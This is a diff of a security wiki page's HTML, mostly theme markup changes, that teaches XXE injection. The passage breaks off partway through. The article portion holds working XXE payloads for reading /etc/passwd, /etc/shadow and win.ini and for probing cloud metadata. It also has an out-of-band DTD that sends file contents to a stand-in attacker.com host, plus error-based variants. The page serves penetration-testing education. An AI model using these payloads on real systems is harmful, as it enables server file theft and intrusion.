@@ -1,39 +1,57 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en" dir="ltr" data-theme="light">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="XXE (XML External Entities) # XML External Entity Injection (XXE) is a web security vulnerability that allows attackers to interfere with an application&rsquo;s processing of XML data. It occurs when a weakly configured XML parser processes untrusted XML input that contains a reference to an external entity, enabling the attacker to read files on the server or interact with internal back-end systems.
-XXE allows attackers to abuse XML parsers by injecting malicious external entities, leading to:">
-<meta name="theme-color" content="#FFFFFF">
-<meta name="color-scheme" content="light dark"><meta property="og:title" content="XXE (XML External Entities)" />
-<meta property="og:description" content="XXE (XML External Entities) # XML External Entity Injection (XXE) is a web security vulnerability that allows attackers to interfere with an application&rsquo;s processing of XML data. It occurs when a weakly configured XML parser processes untrusted XML input that contains a reference to an external entity, enabling the attacker to read files on the server or interact with internal back-end systems.
-XXE allows attackers to abuse XML parsers by injecting malicious external entities, leading to:" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/XXE-XML-External-Entities/" /><meta property="article:section" content="docs" />
-
-<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
-<title>XXE (XML External Entities) | Cyber Security Wiki</title>
-<link rel="manifest" href="/manifest.json">
-<link rel="icon" href="/favicon.png" type="image/x-icon">
-<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
-  <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
-
-  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
-<!--
+  <!--
 Made with Book Theme
 https://github.com/alex-shpak/hugo-book
 -->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="XXE (XML External Entities)# XML External Entity Injection (XXE) is a web security vulnerability that allows attackers to interfere with an application’s processing of XML data. It occurs when a weakly configured XML parser processes untrusted XML input that contains a reference to an external entity, enabling the attacker to read files on the server or interact with internal back-end systems.
+XXE allows attackers to abuse XML parsers by injecting malicious external entities, leading to:
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/XXE-XML-External-Entities/">
+	<meta property="og:site_name" content="Cyber Security Wiki">
+	<meta property="og:title" content="XXE (XML External Entities)">
+	<meta property="og:description" content="XXE (XML External Entities)# XML External Entity Injection (XXE) is a web security vulnerability that allows attackers to interfere with an application’s processing of XML data. It occurs when a weakly configured XML parser processes untrusted XML input that contains a reference to an external entity, enabling the attacker to read files on the server or interact with internal back-end systems.
+XXE allows attackers to abuse XML parsers by injecting malicious external entities, leading to:">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+		<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30">
+
+
+	<meta itemprop="name" content="XXE (XML External Entities)">
+	<meta itemprop="description" content="XXE (XML External Entities)# XML External Entity Injection (XXE) is a web security vulnerability that allows attackers to interfere with an application’s processing of XML data. It occurs when a weakly configured XML parser processes untrusted XML input that contains a reference to an external entity, enabling the attacker to read files on the server or interact with internal back-end systems.
+XXE allows attackers to abuse XML parsers by injecting malicious external entities, leading to:">
+	<meta itemprop="dateModified" content="2026-08-05T21:53:05+05:30">
+	<meta itemprop="wordCount" content="1238">
+
+<title>XXE (XML External Entities) • Cyber Security Wiki</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="https://cyber-security.wiki/docs/application-security/web/XXE-XML-External-Entities/">
+<link rel="stylesheet" href="/book.min.4d77e98d764f495b145946ef9260681bab38aaf7bc01f96a6f61a3a0fea19dbf.css" integrity="sha256-TXfpjXZPSVsUWUbvkmBoG6s4qve8Aflqb2GjoP6hnb8=" crossorigin="anonymous">
+
+
+
+  <script defer type="module" src="/en.search.min.07d8a67671a2c683431c7034b07b0f4b6c6daae7a9c289fde2e3663a9ff4e6c5.js" integrity="sha256-B9imdnGixoNDHHA0sHsPS2xtquepwon94uNmOp/05sU=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
   
 </head>
-<body dir="ltr">
+<body dir="ltr" class="book-kind-page book-type-docs">
   <input type="checkbox" class="hidden toggle" id="menu-control" />
   <input type="checkbox" class="hidden toggle" id="toc-control" />
   <main class="container flex">
-    <aside class="book-menu">
-      <div class="book-menu-content">
-        
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
   <nav>
 <h2 class="book-brand">
   <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
@@ -41,11 +59,15 @@ https://github.com/alex-shpak/hugo-book
 </h2>
 
 
-<div class="book-search">
-  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
   <div class="book-search-spinner hidden"></div>
   <ul id="book-search-results"></ul>
 </div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
 
 
 
@@ -56,9 +78,6 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-
-
-  
 
 
 
@@ -73,8 +92,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
-    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-1f4bf90b10ddb9d04537ec779b672afa" class="toggle" checked />
+    <label for="section-1f4bf90b10ddb9d04537ec779b672afa" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Application Security</a>
     </label>
   
@@ -90,8 +109,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
-    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-97ce584ed7ffb43a07e43ad9f5889c71" class="toggle"  />
+    <label for="section-97ce584ed7ffb43a07e43ad9f5889c71" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Thick Client</a>
     </label>
   
@@ -177,8 +196,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
-    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-26c356cfc062017e944cd67af2378245" class="toggle"  />
+    <label for="section-26c356cfc062017e944cd67af2378245" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Vulnerable Applications</a>
     </label>
   
@@ -225,8 +244,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
-    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-db0925704b156fffd3db5c66cb42d41d" class="toggle" checked />
+    <label for="section-db0925704b156fffd3db5c66cb42d41d" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Web</a>
     </label>
   
@@ -980,8 +999,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
-    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="toggle"  />
+    <label for="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Cloud Security</a>
     </label>
   
@@ -1002,8 +1021,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
-    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5ef99b8721144773b97f7bfef900362b" class="toggle"  />
+    <label for="section-5ef99b8721144773b97f7bfef900362b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">DevSecOps</a>
     </label>
   
@@ -1024,8 +1043,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
-    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="toggle"  />
+    <label for="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Exploit Development</a>
     </label>
   
@@ -1046,8 +1065,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
-    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-2aeefa6ddff0a8e5db97003607c446af" class="toggle"  />
+    <label for="section-2aeefa6ddff0a8e5db97003607c446af" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">IoT Security</a>
     </label>
   
@@ -1068,8 +1087,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
-    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-150b068623f422b911e0c10751e41d4b" class="toggle"  />
+    <label for="section-150b068623f422b911e0c10751e41d4b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Machine Learning</a>
     </label>
   
@@ -1103,8 +1122,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
-    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5d1d2284d8b625a6ff29beaf70c29606" class="toggle"  />
+    <label for="section-5d1d2284d8b625a6ff29beaf70c29606" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Network</a>
     </label>
   
@@ -1125,8 +1144,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
-    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="toggle"  />
+    <label for="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Red Teaming</a>
     </label>
   
@@ -1147,8 +1166,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
-    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-48d01542c459fd722a2e871cc9bbd985" class="toggle"  />
+    <label for="section-48d01542c459fd722a2e871cc9bbd985" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Threat Modelling</a>
     </label>
   
@@ -1169,35 +1188,13 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-<hr>
-<b>
 
-
-  
-<ul>
-  
-  <li>
-    <a href="/contribute/" >
-        Contribute
-      </a>
-  </li>
-  
-  <li>
-    <a href="https://securecode.wiki" target="_blank" rel="noopener">
-        Secure Code Wiki by Payatu
-      </a>
-  </li>
-  
-</ul>
+<ul><li><a href="/contribute/" title="Contribute">contribute</a></li><li><a href="https://securecode.wiki" target="_blank" rel="noopener">Secure Code Wiki by Payatu</a></li></ul>
 
 
 
 
-
-
-</b>
 </nav>
-
 
 
 
@@ -1205,30 +1202,31 @@ https://github.com/alex-shpak/hugo-book
   <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
 
 
+
+  </div>
+</aside>
  
-      </div>
-    </aside>
 
     <div class="book-page">
-      <header class="book-header">
+      <header class="book-header hidden">
         
   <div class="flex align-center justify-between">
   <label for="menu-control">
-    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
   </label>
 
-  <strong>XXE (XML External Entities)</strong>
+  <h3>XXE (XML External Entities)</h3>
 
   <label for="toc-control">
     
-    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
     
   </label>
 </div>
 
 
   
-  <aside class="hidden clearfix">
+  <aside class="hidden">
     
   
 <nav id="TableOfContents">
@@ -1266,7 +1264,7 @@ https://github.com/alex-shpak/hugo-book
             <li><a href="#3-xxe-via-xinclude-bypass-dtd-blocks"><strong>3. XXE via XInclude (Bypass DTD Blocks)</strong></a></li>
             <li><a href="#4-xxe-in-soap-requests"><strong>4. XXE in SOAP Requests</strong></a></li>
             <li><a href="#5-xxe-for-rce-rare-but-possible"><strong>5. XXE for RCE (Rare but Possible)</strong></a></li>
-            <li><a href="#phpexpectwrapper"><strong>PHP <code>expect://</code> Wrapper</strong></a></li>
+            <li><a href="#php"><strong>PHP <code>expect://</code> Wrapper</strong></a></li>
             <li><a href="#6-billion-laugh-attack">6. <strong>Billion Laugh Attack</strong></a></li>
             <li><a href="#xslt-based-rce"><strong>XSLT-Based RCE</strong></a></li>
             <li><a href="#7-bypassing-wafs--filters"><strong>7. Bypassing WAFs &amp; Filters</strong></a></li>
@@ -1283,7 +1281,7 @@ https://github.com/alex-shpak/hugo-book
         <li><a href="#framework-specific-scenarios">Framework-Specific Scenarios</a>
           <ul>
             <li><a href="#java">Java</a></li>
-            <li><a href="#php">PHP</a></li>
+            <li><a href="#php-1">PHP</a></li>
             <li><a href="#net">.NET</a></li>
             <li><a href="#python">Python</a></li>
             <li><a href="#nodejs">Node.js</a></li>
@@ -1330,10 +1328,7 @@ https://github.com/alex-shpak/hugo-book
 
       
       
-  <article class="markdown"><h1 id="xxe-xml-external-entities">
-  XXE (XML External Entities)
-  <a class="anchor" href="#xxe-xml-external-entities">#</a>
-</h1>
+  <article class="markdown book-article"><h1 id="xxe-xml-external-entities">XXE (XML External Entities)<a class="anchor" href="#xxe-xml-external-entities">#</a></h1>
 <p><strong>XML External Entity Injection (XXE)</strong> is a web security vulnerability that allows attackers to interfere with an application&rsquo;s processing of XML data. It occurs when a weakly configured XML parser processes untrusted XML input that contains a reference to an external entity, enabling the attacker to read files on the server or interact with internal back-end systems.</p>
 <p>XXE allows attackers to abuse XML parsers by injecting malicious external entities, leading to:</p>
 <p>✅ <strong>File Disclosure</strong> (e.g., <strong><code>/etc/passwd</code></strong>, <strong><code>/proc/self/environ</code></strong>)</p>
@@ -1342,40 +1337,27 @@ https://github.com/alex-shpak/hugo-book
 <p>✅ <strong>Denial of Service</strong> (Billion Laughs, Quadratic Blowup)</p>
 <p>✅ <strong>RCE</strong> (In rare cases via PHP <strong><code>expect://</code></strong>, XSLT)</p>
 <hr>
-<h2 id="fundamentals-of-xxe">
-  Fundamentals of XXE
-  <a class="anchor" href="#fundamentals-of-xxe">#</a>
-</h2>
-<h3 id="xml-components">
-  XML Components
-  <a class="anchor" href="#xml-components">#</a>
-</h3>
+<h2 id="fundamentals-of-xxe">Fundamentals of XXE<a class="anchor" href="#fundamentals-of-xxe">#</a></h2>
+<h3 id="xml-components">XML Components<a class="anchor" href="#xml-components">#</a></h3>
 <p>Common XML declarations:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE root [
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
 </span></span><span style="display:flex;"><span>]&gt;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;root&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/root&gt;</span>
-</span></span></code></pre></div><ul>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;root&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/root&gt;</span></span></span></code></pre></div><ul>
 <li><strong>DOCTYPE</strong> – Defines the document type.</li>
 <li><strong>ENTITY</strong> – Declares reusable variables.</li>
 <li><strong>SYSTEM</strong> – Loads resources from local files or remote URLs.</li>
 <li><strong>PUBLIC</strong> – References externally available DTDs.</li>
 </ul>
-<h3 id="types-of-xml-entities">
-  Types of XML Entities
-  <a class="anchor" href="#types-of-xml-entities">#</a>
-</h3>
+<h3 id="types-of-xml-entities">Types of XML Entities<a class="anchor" href="#types-of-xml-entities">#</a></h3>
 <ul>
 <li>Internal entities</li>
 <li>External entities</li>
 <li>Parameter entities (<code>%entity</code>)</li>
 <li>General entities (<code>&amp;entity;</code>)</li>
 </ul>
-<h3 id="when-xxe-is-possible">
-  When XXE is Possible
-  <a class="anchor" href="#when-xxe-is-possible">#</a>
-</h3>
+<h3 id="when-xxe-is-possible">When XXE is Possible<a class="anchor" href="#when-xxe-is-possible">#</a></h3>
 <p>Typical situations include:</p>
 <ul>
 <li>SOAP APIs</li>
@@ -1387,10 +1369,7 @@ https://github.com/alex-shpak/hugo-book
 <li>XML configuration imports</li>
 <li>XML-based file uploads</li>
 </ul>
-<h3 id="requirements">
-  Requirements
-  <a class="anchor" href="#requirements">#</a>
-</h3>
+<h3 id="requirements">Requirements<a class="anchor" href="#requirements">#</a></h3>
 <p>XXE generally requires:</p>
 <ul>
 <li>XML parsing enabled</li>
@@ -1398,10 +1377,7 @@ https://github.com/alex-shpak/hugo-book
 <li>DTD processing enabled (except XInclude attacks)</li>
 </ul>
 <hr>
-<h2 id="attack-surface">
-  Attack Surface
-  <a class="anchor" href="#attack-surface">#</a>
-</h2>
+<h2 id="attack-surface">Attack Surface<a class="anchor" href="#attack-surface">#</a></h2>
 <p>Look for XML processing in:</p>
 <ul>
 <li>SOAP services</li>
@@ -1418,96 +1394,51 @@ https://github.com/alex-shpak/hugo-book
 <li>Third-party XML parsers</li>
 </ul>
 <hr>
-<h2 id="exploitation-techniques">
-  Exploitation Techniques
-  <a class="anchor" href="#exploitation-techniques">#</a>
-</h2>
-<h3 id="1-quick-check-for-xxe">
-  <strong>1. Quick Check for XXE</strong>
-  <a class="anchor" href="#1-quick-check-for-xxe">#</a>
-</h3>
+<h2 id="exploitation-techniques">Exploitation Techniques<a class="anchor" href="#exploitation-techniques">#</a></h2>
+<h3 id="1-quick-check-for-xxe"><strong>1. Quick Check for XXE</strong><a class="anchor" href="#1-quick-check-for-xxe">#</a></h3>
 <p><strong>Send this minimal payload</strong> to test if XML parsing is vulnerable:</p>
 <pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34;?&gt;
-&lt;!DOCTYPE test [ &lt;!ENTITY xxe &#34;XXE_TEST&#34;&gt; ]&gt;&lt;test&gt;&amp;xxe;&lt;/test&gt;
-</code></pre><p><strong>If output contains <code>XXE_TEST</code> → XXE is possible!</strong></p>
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe &#34;XXE_TEST&#34;&gt; ]&gt;&lt;test&gt;&amp;xxe;&lt;/test&gt;</code></pre><p><strong>If output contains <code>XXE_TEST</code> → XXE is possible!</strong></p>
 <p><strong>For Blind One:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;http://collaborator-url/&#34;&gt;</span>]&gt;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;foo&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/foo&gt;</span>
-</span></span></code></pre></div><p>If you receive interactions on the collaborator server, XXE might be there.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;http://collaborator-url/&#34;&gt;</span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;foo&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/foo&gt;</span></span></span></code></pre></div><p>If you receive interactions on the collaborator server, XXE might be there.</p>
 <hr>
-<h3 id="2-classic-file-read-linuxwindows">
-  <strong>2. Classic File Read (Linux/Windows)</strong>
-  <a class="anchor" href="#2-classic-file-read-linuxwindows">#</a>
-</h3>
-<h3 id="linux">
-  <strong>Linux:</strong>
-  <a class="anchor" href="#linux">#</a>
-</h3>
+<h3 id="2-classic-file-read-linuxwindows"><strong>2. Classic File Read (Linux/Windows)</strong><a class="anchor" href="#2-classic-file-read-linuxwindows">#</a></h3>
+<h3 id="linux"><strong>Linux:</strong><a class="anchor" href="#linux">#</a></h3>
 <pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34;?&gt;
 &lt;!DOCTYPE data [
   &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;
-]&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;
-</code></pre><h3 id="windows">
-  <strong>Windows:</strong>
-  <a class="anchor" href="#windows">#</a>
-</h3>
+]&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;</code></pre><h3 id="windows"><strong>Windows:</strong><a class="anchor" href="#windows">#</a></h3>
 <pre tabindex="0"><code>&lt;!DOCTYPE data [
   &lt;!ENTITY xxe SYSTEM &#34;file:///C:/Windows/win.ini&#34;&gt;
-]&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;
-</code></pre><p>✅ <strong>Look for file contents in response.</strong></p>
+]&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;</code></pre><p>✅ <strong>Look for file contents in response.</strong></p>
 <hr>
-<h3 id="3-ssrf-test-internal-network-probe">
-  <strong>3. SSRF Test (Internal Network Probe)</strong>
-  <a class="anchor" href="#3-ssrf-test-internal-network-probe">#</a>
-</h3>
+<h3 id="3-ssrf-test-internal-network-probe"><strong>3. SSRF Test (Internal Network Probe)</strong><a class="anchor" href="#3-ssrf-test-internal-network-probe">#</a></h3>
 <pre tabindex="0"><code>&lt;!DOCTYPE foo [
   &lt;!ENTITY xxe SYSTEM &#34;&lt;http://169.254.169.254/latest/meta-data/&gt;&#34;&gt;
-]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
-</code></pre><p>✅ <strong>Check for AWS/Azure/GCP metadata leaks.</strong></p>
-<h3 id="4-base64-encoded">
-  <strong>4. Base64 Encoded</strong>
-  <a class="anchor" href="#4-base64-encoded">#</a>
-</h3>
-<pre tabindex="0"><code>&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM &#34;data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk&#34;&gt; %init; ]&gt;&lt;foo/&gt;
-</code></pre><hr>
-<h2 id="advanced-xxe-attack-vectors">
-  <strong>Advanced XXE Attack Vectors</strong>
-  <a class="anchor" href="#advanced-xxe-attack-vectors">#</a>
-</h2>
-<h3 id="1-blind-xxe-with-out-of-band-oob-data-exfiltration">
-  <strong>1. Blind XXE with Out-of-Band (OOB) Data Exfiltration</strong>
-  <a class="anchor" href="#1-blind-xxe-with-out-of-band-oob-data-exfiltration">#</a>
-</h3>
+]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre><p>✅ <strong>Check for AWS/Azure/GCP metadata leaks.</strong></p>
+<h3 id="4-base64-encoded"><strong>4. Base64 Encoded</strong><a class="anchor" href="#4-base64-encoded">#</a></h3>
+<pre tabindex="0"><code>&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM &#34;data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk&#34;&gt; %init; ]&gt;&lt;foo/&gt;</code></pre><hr>
+<h2 id="advanced-xxe-attack-vectors"><strong>Advanced XXE Attack Vectors</strong><a class="anchor" href="#advanced-xxe-attack-vectors">#</a></h2>
+<h3 id="1-blind-xxe-with-out-of-band-oob-data-exfiltration"><strong>1. Blind XXE with Out-of-Band (OOB) Data Exfiltration</strong><a class="anchor" href="#1-blind-xxe-with-out-of-band-oob-data-exfiltration">#</a></h3>
 <p>When <strong>no direct response</strong> is visible, use <strong>DNS/HTTP exfiltration</strong>:</p>
-<h3 id="method-1-classic-oob-via-parameter-entities">
-  <strong>Method 1: Classic OOB via Parameter Entities</strong>
-  <a class="anchor" href="#method-1-classic-oob-via-parameter-entities">#</a>
-</h3>
+<h3 id="method-1-classic-oob-via-parameter-entities"><strong>Method 1: Classic OOB via Parameter Entities</strong><a class="anchor" href="#method-1-classic-oob-via-parameter-entities">#</a></h3>
 <pre tabindex="0"><code>&lt;!DOCTYPE foo [
   &lt;!ENTITY % xxe SYSTEM &#34;&lt;http://attacker.com/evil.dtd&gt;&#34;&gt;
   %xxe;
-]&gt;&lt;foo&gt;&lt;/foo&gt;
-</code></pre><p><strong>evil.dtd</strong> (Hosted on attacker server):</p>
+]&gt;&lt;foo&gt;&lt;/foo&gt;</code></pre><p><strong>evil.dtd</strong> (Hosted on attacker server):</p>
 <pre tabindex="0"><code>&lt;!ENTITY % file SYSTEM &#34;file:///etc/passwd&#34;&gt;
 &lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;http://attacker.com/?leak=%file;&#39;&gt;&#34;&gt;
 %eval;
-%exfil;
-</code></pre><h3 id="method-2-error-based-exfiltration">
-  <strong>Method 2: Error-Based Exfiltration</strong>
-  <a class="anchor" href="#method-2-error-based-exfiltration">#</a>
-</h3>
+%exfil;</code></pre><h3 id="method-2-error-based-exfiltration"><strong>Method 2: Error-Based Exfiltration</strong><a class="anchor" href="#method-2-error-based-exfiltration">#</a></h3>
 <p>If HTTP exfiltration fails, force an <strong>error message</strong> containing data:</p>
 <pre tabindex="0"><code>&lt;!DOCTYPE foo [
   &lt;!ENTITY % file SYSTEM &#34;file:///etc/shadow&#34;&gt;
   &lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; error SYSTEM &#39;file:///nonexistent/%file;&#39;&gt;&#34;&gt;
   %eval;
   %error;
-]&gt;
-</code></pre><p><em>(Works if server reflects errors in responses.)</em></p>
-<h3 id="method-3-repurposing-a-local-dtd">
-  Method 3: <strong>Repurposing a local DTD</strong>
-  <a class="anchor" href="#method-3-repurposing-a-local-dtd">#</a>
-</h3>
+]&gt;</code></pre><p><em>(Works if server reflects errors in responses.)</em></p>
+<h3 id="method-3-repurposing-a-local-dtd">Method 3: <strong>Repurposing a local DTD</strong><a class="anchor" href="#method-3-repurposing-a-local-dtd">#</a></h3>
 <pre tabindex="0"><code>&lt;!DOCTYPE message [
 &lt;!ENTITY % local_dtd SYSTEM &#34;file:///usr/share/yelp/dtd/docbookx.dtd&#34;&gt;
 &lt;!ENTITY % ISOamso &#39;
@@ -1517,65 +1448,35 @@ https://github.com/alex-shpak/hugo-book
 &amp;#x25;error;
 &#39;&gt;
 %local_dtd;
-]&gt;
-</code></pre><p>This payload will import the Yelp DTD, then redefine the <code>ISOamso</code> entity, triggering an error message containing the contents of the <code>/etc/passwd</code> file.</p>
+]&gt;</code></pre><p>This payload will import the Yelp DTD, then redefine the <code>ISOamso</code> entity, triggering an error message containing the contents of the <code>/etc/passwd</code> file.</p>
 <hr>
-<h3 id="2-xxe-inside-non-xml-formats">
-  <strong>2. XXE Inside Non-XML Formats</strong>
